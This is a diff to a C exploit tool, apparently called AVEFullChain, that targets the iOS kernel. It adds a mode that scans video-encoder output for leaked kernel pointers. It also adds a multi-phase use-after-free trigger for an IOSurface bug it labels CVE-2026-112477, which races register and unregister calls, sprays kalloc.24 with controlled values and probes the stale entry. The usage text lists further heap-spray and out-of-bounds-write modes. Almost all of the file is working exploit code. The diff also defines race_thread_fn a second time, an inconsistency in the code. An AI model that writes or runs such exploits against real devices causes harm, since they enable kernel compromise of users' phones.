@@ -67,6 +67,7 @@ extern size_t IOSurfaceGetPlaneCount(IOSurfaceRef surface);
 extern int32_t IOSurfaceGetUseCount(IOSurfaceRef surface);
 extern Boolean IOSurfaceIsInUse(IOSurfaceRef surface);
 extern size_t IOSurfaceGetBytesPerRow(IOSurfaceRef surface);
+extern IOSurfaceRef IOSurfaceLookup(IOSurfaceID csid);
 
 static FILE *g_log = NULL;
 static volatile int g_encode_done = 0;
@@ -930,6 +931,26 @@ static void *race_thread_fn(void *arg) {
 
 static int g_main_argc;
 static char **g_main_argv;
+
+/* Race thread context for IOSurface UAF (CVE-2026-112477) */
+typedef struct {
+    io_connect_t conn;
+    uint32_t surface_id;
+    uint32_t selector;
+    volatile int go;
+    volatile int done;
+    kern_return_t result;
+} race_ctx_t;
+
+static void *race_thread_fn(void *arg) {
+    race_ctx_t *ctx = (race_ctx_t *)arg;
+    while (!ctx->go) { /* spin */ }
+    uint64_t input[1] = { ctx->surface_id };
+    ctx->result = IOConnectCallMethod(ctx->conn, ctx->selector,
+        input, 1, NULL, 0, NULL, NULL, NULL, NULL);
+    ctx->done = 1;
+    return NULL;
+}
 
 static void *worker_thread(void *arg) {
     (void)arg;
@@ -7717,6 +7738,170 @@ vps_cd_done:
 
         rlog("\n=== DIMENSION_OOB complete ===\n");
 
+    } else if (strcmp(mode, "temporal_bitstream") == 0) {
+        /*
+         * temporal_bitstream — Compare raw H.265 bitstream at OOB temporal layers
+         *
+         * NumberOfTemporalLayers accepts ANY value. TL>7 produces no VPS
+         * but encode STILL SUCCEEDS. The firmware uses TL to configure
+         * temporal layer processing — OOB TL values may cause the firmware
+         * to read from adjacent memory, with artifacts in the raw output.
+         *
+         * This mode compares raw NAL bitstream length and content at
+         * various TL values against baseline TL=1.
+         */
+        int max_tl = (argc > 2) ? atoi(argv[2]) : 64;
+        int enable_mctf = (argc > 3) ? atoi(argv[3]) : 0;
+        if (max_tl < 1) max_tl = 1;
+        if (max_tl > 255) max_tl = 255;
+
+        int vw = 192, vh = 192;
+        rlog("=== TEMPORAL_BITSTREAM: Raw output comparison at OOB TL ===\n");
+        rlog("TL range: 1-%d, MCTF=%d, res=%dx%d\n\n", max_tl, enable_mctf, vw, vh);
+
+        /* Baseline: TL=1 */
+        uint8_t base_nal[4096];
+        size_t base_len = 0;
+        {
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
+                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(es);
+            if (cs == noErr && s) {
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                int one = 1;
+                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &one);
+                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), n1);
+                CFRelease(n1);
+                int kf = 1;
+                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
+                CFRelease(kfn);
+                if (enable_mctf)
+                    VTSessionSetProperty(s, CFSTR("EnableMCTF"), kCFBooleanTrue);
+                VTCompressionSessionPrepareToEncodeFrames(s);
+
+                g_encode_done = 0; g_cb_status = -999; g_saved_nal_len = 0;
+                CVPixelBufferRef pb = create_pb(vw, vh);
+                if (pb) {
+                    VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0,30),
+                        kCMTimeInvalid, NULL, NULL, NULL);
+                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                    for (int w = 0; w < 300 && !g_encode_done; w++) usleep(10000);
+                    CVPixelBufferRelease(pb);
+                }
+                if (g_saved_nal_len > 0 && g_saved_nal_len <= 4096) {
+                    memcpy(base_nal, g_saved_nal, g_saved_nal_len);
+                    base_len = g_saved_nal_len;
+                }
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+            }
+        }
+        rlog("Baseline (TL=1): %zu bytes, enc=%d\n", base_len, (int)g_cb_status);
+        if (base_len > 0) {
+            rlog("  first64: ");
+            for (size_t j = 0; j < 64 && j < base_len; j++) rlog("%02x", base_nal[j]);
+            rlog("\n");
+        }
+        rlog("\n");
+
+        int test_vals[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 15, 16,
+                           20, 24, 32, 48, 64, 96, 100, 128, 200, 255};
+        int ntests = sizeof(test_vals)/sizeof(test_vals[0]);
+
+        for (int t = 0; t < ntests && test_vals[t] <= max_tl; t++) {
+            int tl = test_vals[t];
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
+                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(es);
+            if (cs != noErr || !s) {
+                rlog("TL=%3d: create FAIL\n", tl);
+                continue;
+            }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            CFNumberRef tn = CFNumberCreate(NULL, kCFNumberIntType, &tl);
+            VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), tn);
+            CFRelease(tn);
+            int kf = 1;
+            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
+            CFRelease(kfn);
+            if (enable_mctf)
+                VTSessionSetProperty(s, CFSTR("EnableMCTF"), kCFBooleanTrue);
+            VTCompressionSessionPrepareToEncodeFrames(s);
+
+            g_encode_done = 0; g_cb_status = -999; g_saved_nal_len = 0;
+            g_cb_had_fmt = 0;
+            CVPixelBufferRef pb = create_pb(vw, vh);
+            if (pb) {
+                VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(tl, 30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                for (int w = 0; w < 300 && !g_encode_done; w++) usleep(10000);
+                CVPixelBufferRelease(pb);
+            }
+
+            size_t nlen = g_saved_nal_len;
+            rlog("TL=%3d: enc=%d fmt=%d nal=%zu",
+                 tl, (int)g_cb_status, g_cb_had_fmt, nlen);
+
+            /* Compare NAL length */
+            if (nlen != base_len) {
+                long diff = (long)nlen - (long)base_len;
+                rlog(" *** LEN %+ld ***", diff);
+            }
+
+            /* Compare NAL content (first 256 bytes) */
+            if (nlen > 0 && base_len > 0) {
+                size_t cmplen = (nlen < base_len) ? nlen : base_len;
+                if (cmplen > 256) cmplen = 256;
+                int ndiff = 0;
+                for (size_t j = 0; j < cmplen; j++)
+                    if (g_saved_nal[j] != base_nal[j]) ndiff++;
+                if (ndiff > 0) rlog(" %d diffs/256", ndiff);
+
+                /* Scan for kernel pointers in NAL output */
+                size_t scanlen = (nlen > 4096) ? 4096 : nlen;
+                for (size_t j = 0; j + 8 <= scanlen; j += 4) {
+                    uint64_t qw; memcpy(&qw, g_saved_nal + j, 8);
+                    if ((qw >> 40) == 0xfffffe || (qw >> 40) == 0xffff80) {
+                        rlog("\n  *** KPTR@%zu: 0x%016llx ***", j, (unsigned long long)qw);
+                    }
+                }
+            }
+            rlog("\n");
+
+            /* For interesting TL values, dump more detail */
+            if (tl == 8 || tl == 16 || tl == 32 || tl == 64 || tl == 128 || tl == 255) {
+                if (nlen > 0) {
+                    rlog("  first64: ");
+                    for (size_t j = 0; j < 64 && j < nlen; j++) rlog("%02x", g_saved_nal[j]);
+                    rlog("\n");
+                    if (nlen > 64) {
+                        rlog("  last64:  ");
+                        size_t start = (nlen > 64) ? nlen - 64 : 0;
+                        for (size_t j = start; j < nlen; j++) rlog("%02x", g_saved_nal[j]);
+                        rlog("\n");
+                    }
+                }
+            }
+
+            VTCompressionSessionInvalidate(s); CFRelease(s);
+            usleep(30000);
+        }
+
+        rlog("\n=== TEMPORAL_BITSTREAM complete ===\n");
+
     } else if (strcmp(mode, "vps_byte_dump") == 0) {
         /*
          * vps_byte_dump — Dump raw VPS NAL bytes at varying AlphaLayerID values
@@ -7922,6 +8107,299 @@ vps_cd_done:
 
         rlog("=== VPS_BYTE_DUMP complete ===\n");
 
+    } else if (strcmp(mode, "iosurface_uaf") == 0) {
+        /*
+         * iosurface_uaf — CVE-2026-112477 IOSurface UAF trigger
+         *
+         * Race condition between IOSurface register (s_insert_surface,
+         * selector 17) and unregister (s_remove_surface, selector 18).
+         * The freed object lives in kalloc.24. After triggering the UAF,
+         * we groom kalloc.24 with controlled 24-byte allocations and
+         * verify the stale entry is reachable.
+         *
+         * Sequence: register → race(unregister, re-register) → detect stale
+         * Detection: re-register returns 0 (success) instead of 0xE00002C9
+         *            (kIOReturnBusy / duplicate) if the entry was freed.
+         *
+         * Fixed in iOS 27.2. Vulnerable on 27.1.
+         */
+        int race_rounds = (argc > 2) ? atoi(argv[2]) : 500;
+        int groom_count = (argc > 3) ? atoi(argv[3]) : 512;
+        int thread_count = (argc > 4) ? atoi(argv[4]) : 8;
+        if (race_rounds < 10) race_rounds = 10;
+        if (race_rounds > 5000) race_rounds = 5000;
+        if (groom_count < 64) groom_count = 64;
+        if (groom_count > 2048) groom_count = 2048;
+        if (thread_count < 2) thread_count = 2;
+        if (thread_count > 16) thread_count = 16;
+
+        rlog("=== IOSURFACE_UAF: CVE-2026-112477 trigger ===\n");
+        rlog("race_rounds=%d, groom_count=%d, threads=%d\n\n", race_rounds, groom_count, thread_count);
+
+        /* Phase 1: Verify IOSurface is accessible */
+        rlog("--- Phase 1: IOSurface accessibility ---\n");
+
+        CFMutableDictionaryRef surf_props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int sw = 32, sh = 32, sbpe = 4, sbpr = 128;
+        CFNumberRef swn = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+        CFNumberRef shn = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+        CFNumberRef sbn = CFNumberCreate(NULL, kCFNumberIntType, &sbpe);
+        CFNumberRef sbrn = CFNumberCreate(NULL, kCFNumberIntType, &sbpr);
+        int spf = 0x42475241; /* BGRA */
+        CFNumberRef spfn = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+        CFDictionarySetValue(surf_props, CFSTR("IOSurfaceWidth"), swn);
+        CFDictionarySetValue(surf_props, CFSTR("IOSurfaceHeight"), shn);
+        CFDictionarySetValue(surf_props, CFSTR("IOSurfaceBytesPerElement"), sbn);
+        CFDictionarySetValue(surf_props, CFSTR("IOSurfaceBytesPerRow"), sbrn);
+        CFDictionarySetValue(surf_props, CFSTR("IOSurfacePixelFormat"), spfn);
+
+        IOSurfaceRef test_surf = IOSurfaceCreate(surf_props);
+        if (!test_surf) {
+            rlog("FAIL: Cannot create IOSurface — sandbox blocks it\n");
+            CFRelease(surf_props);
+            CFRelease(swn); CFRelease(shn); CFRelease(sbn); CFRelease(sbrn); CFRelease(spfn);
+            goto done;
+        }
+        uint32_t test_id = IOSurfaceGetID(test_surf);
+        rlog("IOSurface created: ID=%u, alloc=%zu bytes\n", test_id, IOSurfaceGetAllocSize(test_surf));
+
+        /* Phase 2: Open IOSurfaceRootUserClient via IOKit */
+        rlog("\n--- Phase 2: IOSurfaceRootUserClient ---\n");
+
+        io_service_t iosurface_svc = IOServiceGetMatchingService(
+            kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+        if (!iosurface_svc) {
+            rlog("FAIL: IOSurfaceRoot service not found\n");
+            CFRelease(test_surf); CFRelease(surf_props);
+            CFRelease(swn); CFRelease(shn); CFRelease(sbn); CFRelease(sbrn); CFRelease(spfn);
+            goto done;
+        }
+        rlog("IOSurfaceRoot service: 0x%x\n", iosurface_svc);
+
+        /* Open multiple connections for the race */
+        io_connect_t *conns = calloc(thread_count, sizeof(io_connect_t));
+        int open_count = 0;
+        for (int i = 0; i < thread_count; i++) {
+            kern_return_t kr = IOServiceOpen(iosurface_svc, mach_task_self(), 0, &conns[i]);
+            if (kr == KERN_SUCCESS) {
+                open_count++;
+            } else {
+                rlog("IOServiceOpen[%d]: 0x%x FAIL\n", i, kr);
+                conns[i] = 0;
+            }
+        }
+        rlog("Opened %d / %d IOSurfaceRootUserClient connections\n", open_count, thread_count);
+
+        if (open_count < 2) {
+            rlog("FAIL: Need at least 2 connections for the race\n");
+            for (int i = 0; i < thread_count; i++)
+                if (conns[i]) IOServiceClose(conns[i]);
+            free(conns);
+            IOObjectRelease(iosurface_svc);
+            CFRelease(test_surf); CFRelease(surf_props);
+            CFRelease(swn); CFRelease(shn); CFRelease(sbn); CFRelease(sbrn); CFRelease(spfn);
+            goto done;
+        }
+
+        /* Phase 3: Enumerate available selectors on the user client */
+        rlog("\n--- Phase 3: Selector enumeration ---\n");
+        for (uint32_t sel = 0; sel <= 40; sel++) {
+            uint64_t input[8] = {0};
+            uint32_t out_cnt = 0;
+            kern_return_t kr = IOConnectCallMethod(conns[0], sel,
+                input, 0, NULL, 0, NULL, &out_cnt, NULL, NULL);
+            if (kr != 0xE00002C2 /* kIOReturnUnsupported */ &&
+                kr != 0xE00002BC /* kIOReturnBadArgument sometimes */) {
+                rlog("  sel %2u: 0x%08x %s\n", sel, kr,
+                    kr == KERN_SUCCESS ? "OK" :
+                    kr == 0xE00002C9 ? "BUSY" :
+                    kr == 0xE00002BD ? "BAD_ARG" :
+                    kr == 0xE00002BE ? "INVALID" : "");
+            }
+        }
+
+        /* Phase 4: Create surfaces for the race */
+        rlog("\n--- Phase 4: Surface pool for UAF race ---\n");
+        int pool_size = 64;
+        IOSurfaceRef *surf_pool = calloc(pool_size, sizeof(IOSurfaceRef));
+        uint32_t *surf_ids = calloc(pool_size, sizeof(uint32_t));
+        int pool_created = 0;
+
+        for (int i = 0; i < pool_size; i++) {
+            surf_pool[i] = IOSurfaceCreate(surf_props);
+            if (surf_pool[i]) {
+                surf_ids[i] = IOSurfaceGetID(surf_pool[i]);
+                pool_created++;
+            }
+        }
+        rlog("Surface pool: %d / %d created (IDs %u - %u)\n",
+            pool_created, pool_size,
+            pool_created > 0 ? surf_ids[0] : 0,
+            pool_created > 0 ? surf_ids[pool_created - 1] : 0);
+
+        /* Phase 5: Race — register/unregister on different connections */
+        rlog("\n--- Phase 5: UAF race (sel 17 register / sel 18 unregister) ---\n");
+        rlog("Racing %d rounds...\n", race_rounds);
+
+        int uaf_hits = 0;
+        int race_success_count = 0;
+        uint32_t winning_surf_id = 0;
+
+        for (int round = 0; round < race_rounds; round++) {
+            /* Pick a surface from pool */
+            int pidx = round % pool_created;
+            uint32_t target_id = surf_ids[pidx];
+
+            /* First: register the surface on conn[0] via selector 17 */
+            {
+                uint64_t input[1] = { target_id };
+                kern_return_t kr = IOConnectCallMethod(conns[0], 17,
+                    input, 1, NULL, 0, NULL, NULL, NULL, NULL);
+                /* Register may succeed (0) or fail (already registered).
+                   Either way, there's now a reference to race against. */
+                (void)kr;
+            }
+
+            /* Race: conn[1] unregisters (sel 18) while conn[0] re-registers (sel 17) */
+            race_ctx_t unreg_ctx = { .conn = conns[1], .surface_id = target_id,
+                                     .selector = 18, .go = 0, .done = 0 };
+            race_ctx_t rereg_ctx = { .conn = conns[0], .surface_id = target_id,
+                                     .selector = 17, .go = 0, .done = 0 };
+
+            pthread_t t1, t2;
+            pthread_create(&t1, NULL, race_thread_fn, &unreg_ctx);
+            pthread_create(&t2, NULL, race_thread_fn, &rereg_ctx);
+
+            /* Tiny stagger then fire */
+            usleep(arc4random_uniform(50));
+            unreg_ctx.go = 1;
+            rereg_ctx.go = 1;
+
+            pthread_join(t1, NULL);
+            pthread_join(t2, NULL);
+
+            /* Detection: if unregister freed it and re-register succeeded
+               (returned 0 instead of kIOReturnBusy 0xE00002C9),
+               the entry slot was reused — UAF condition */
+            if (unreg_ctx.result == KERN_SUCCESS && rereg_ctx.result == KERN_SUCCESS) {
+                race_success_count++;
+
+                /* Verify: try to unregister again — if it succeeds twice,
+                   the internal refcount is confused */
+                uint64_t input[1] = { target_id };
+                kern_return_t kr2 = IOConnectCallMethod(conns[1], 18,
+                    input, 1, NULL, 0, NULL, NULL, NULL, NULL);
+                kern_return_t kr3 = IOConnectCallMethod(conns[0], 18,
+                    input, 1, NULL, 0, NULL, NULL, NULL, NULL);
+
+                if (kr2 == KERN_SUCCESS && kr3 == KERN_SUCCESS) {
+                    uaf_hits++;
+                    winning_surf_id = target_id;
+                    if (uaf_hits <= 5) {
+                        rlog("  [%d] UAF HIT! surf=%u unreg=0x%x rereg=0x%x double_unreg=OK\n",
+                            round, target_id, unreg_ctx.result, rereg_ctx.result);
+                    }
+                }
+            }
+
+            /* Clean up: ensure surface is unregistered for next round */
+            {
+                uint64_t input[1] = { target_id };
+                IOConnectCallMethod(conns[0], 18, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
+                IOConnectCallMethod(conns[1], 18, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
+            }
+
+            if (round > 0 && round % 100 == 0) {
+                rlog("  round %d / %d — race_ok=%d uaf_hits=%d\n",
+                    round, race_rounds, race_success_count, uaf_hits);
+            }
+        }
+
+        rlog("\nRace results: %d rounds, %d race_ok, %d UAF hits\n",
+            race_rounds, race_success_count, uaf_hits);
+
+        if (uaf_hits > 0) {
+            rlog("*** CVE-2026-112477 CONFIRMED: UAF triggered %d times ***\n", uaf_hits);
+            rlog("Winning surface ID: %u\n\n", winning_surf_id);
+
+            /* Phase 6: Groom kalloc.24 with controlled fake objects */
+            rlog("--- Phase 6: kalloc.24 groom ---\n");
+            rlog("Spraying %d x 24-byte IOSurface property values...\n", groom_count);
+
+            IOSurfaceRef *groom_surfs = calloc(groom_count, sizeof(IOSurfaceRef));
+            int groom_ok = 0;
+
+            for (int i = 0; i < groom_count; i++) {
+                groom_surfs[i] = IOSurfaceCreate(surf_props);
+                if (groom_surfs[i]) {
+                    /* Set properties that create kalloc.24 allocations in kernel.
+                       Each property value struct in IOSurface is a small kernel alloc.
+                       We use unique values to detect which groom object we hit. */
+                    uint32_t marker = 0x41414141 + i;
+                    CFNumberRef mn = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+                    char key[64];
+                    snprintf(key, sizeof(key), "G%d", i);
+                    IOSurfaceSetValue(groom_surfs[i], CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII), mn);
+                    CFRelease(mn);
+                    groom_ok++;
+                }
+            }
+            rlog("Groom surfaces: %d / %d\n", groom_ok, groom_count);
+
+            /* Phase 7: Verify stale entry points to groomed data */
+            rlog("\n--- Phase 7: Stale entry probe ---\n");
+
+            /* Try to look up the surface through the stale entry.
+               IOSurfaceLookup will follow the freed pointer — if groomed
+               data replaced it, we'll see controlled values. */
+            IOSurfaceRef stale = IOSurfaceLookup(winning_surf_id);
+            if (stale) {
+                rlog("IOSurfaceLookup(stale=%u): GOT SURFACE\n", winning_surf_id);
+                rlog("  Width: %zu\n", IOSurfaceGetWidth(stale));
+                rlog("  Height: %zu\n", IOSurfaceGetHeight(stale));
+                rlog("  AllocSize: %zu\n", IOSurfaceGetAllocSize(stale));
+                rlog("  UseCount: %d\n", (int)IOSurfaceGetUseCount(stale));
+
+                /* Check if values look corrupted / controlled */
+                size_t w = IOSurfaceGetWidth(stale);
+                size_t h = IOSurfaceGetHeight(stale);
+                size_t a = IOSurfaceGetAllocSize(stale);
+                if (w != 32 || h != 32) {
+                    rlog("*** STALE ENTRY READS GROOMED DATA ***\n");
+                    rlog("  Expected w=32 h=32, got w=%zu h=%zu\n", w, h);
+                    rlog("  This confirms kernel dereferences the freed pointer!\n");
+                }
+                CFRelease(stale);
+            } else {
+                rlog("IOSurfaceLookup(stale=%u): NULL (freed entry cleaned up)\n", winning_surf_id);
+                rlog("  Groom timing may need adjustment\n");
+            }
+
+            /* Cleanup groom */
+            for (int i = 0; i < groom_count; i++)
+                if (groom_surfs[i]) CFRelease(groom_surfs[i]);
+            free(groom_surfs);
+
+        } else {
+            rlog("No UAF detected in %d rounds.\n", race_rounds);
+            rlog("Try: more rounds, different thread counts, or add usleep jitter.\n");
+            rlog("The race window may be very tight on A20 Pro.\n");
+        }
+
+        /* Cleanup */
+        for (int i = 0; i < pool_size; i++)
+            if (surf_pool[i]) CFRelease(surf_pool[i]);
+        free(surf_pool); free(surf_ids);
+        for (int i = 0; i < thread_count; i++)
+            if (conns[i]) IOServiceClose(conns[i]);
+        free(conns);
+        IOObjectRelease(iosurface_svc);
+        CFRelease(test_surf); CFRelease(surf_props);
+        CFRelease(swn); CFRelease(shn); CFRelease(sbn); CFRelease(sbrn); CFRelease(spfn);
+
+        rlog("\n=== IOSURFACE_UAF complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -7972,6 +8450,7 @@ vps_cd_done:
         rlog("  heap_feng_shui [n] [aid] -- KEY: Cross-session VPS corruption via OOB (heap spray)\n");
         rlog("  dimension_oob [max_tl] [aid] -- KEY: Info leak via NumberOfTemporalLayers OOB\n");
         rlog("  vps_byte_dump [max_aid] -- KEY: Dump VPS bytes at OOB AlphaLayerID (info leak)\n");
+        rlog("  iosurface_uaf [rounds] [groom] [threads] -- KEY: CVE-112477 IOSurface UAF trigger\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
